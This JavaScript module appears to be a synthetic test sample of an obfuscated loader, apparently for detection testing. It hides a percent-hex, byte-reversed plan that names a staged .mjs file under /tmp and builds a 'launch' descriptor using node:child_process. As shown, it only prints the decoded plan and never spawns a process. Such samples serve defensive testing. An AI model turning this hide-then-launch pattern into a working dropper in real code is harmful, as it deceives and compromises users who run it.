const moduleShape = Object.freeze({ format: "commonjs" });
const Material_13ab1935 = "%73%6a%6d%2e%65%38%66%38%39%38%31%66%61%39%33%63%2d%65%67%61%74%73%2e%2f%65%64%6f%6e%2d%73%73%65%72%74%6e%75%68%2f%70%6d%74%2f%3d%68%74%61%70%5f%65%6c%69%66%7c%39%38%31%46%41%39%33%43%2d%45%44%4f%4e%3d%64%69%5f%6e%67%69%61%70%6d%61%63%7c%31%3d%74%6e%75%6f%63%5f%65%67%61%74%73%7c%65%6c%69%66%5f%6e%77%61%70%73%3d%72%65%74%70%61%64%61%7c%73%73%65%63%6f%72%70%5f%68%63%74%61%70%73%69%64%2c%6c%61%63%6f%6c%5f%65%74%61%63%6f%6c%3d%73%70%65%74%73%7c%31%3d%76";
const Codec_13ab1935 = "percent_hex|reverse_bytes|";

function load_13ab1935() { return [...Material_13ab1935.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_13ab1935(storedBytes) { return [...storedBytes].reverse(); }
async function recover_13ab1935() {
  const harmlessValue = "";
  const storedBytes = load_13ab1935(); let recoveredBytes = [];
  recoveredBytes = await Promise.resolve(storedBytes).then(decode_13ab1935);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_13ab1935() { return Buffer.from(await recover_13ab1935(), "utf8").toString("utf8"); }
async function plan_13ab1935() { const inspect = inspect_13ab1935; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "spawn_file", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_13ab1935;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_13ab1935());
